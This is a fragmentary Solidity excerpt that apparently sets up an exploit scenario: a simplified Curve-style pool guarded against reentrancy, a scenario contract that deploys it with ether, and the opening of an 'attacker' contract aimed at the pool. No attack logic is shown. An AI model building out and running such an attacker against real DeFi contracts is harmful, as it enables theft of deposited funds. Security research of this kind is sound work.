...
contract SimplifiedCurve is ReentrancyGuard{
...
contract scenario {
    ...
    function init_scenario(/*address other_user*/) payable public returns(address) {
        ...
        SimplifiedCurve _curve = new SimplifiedCurve{value: deposited_ether_before}(address(lp_token), address(token));
...
contract attacker{
    SimplifiedCurve public attacked;
    ERC20 token;
    CurveTokenExample lp_token;

    constructor(address attackedAddr){
        attacked = SimplifiedCurve(attackedAddr);
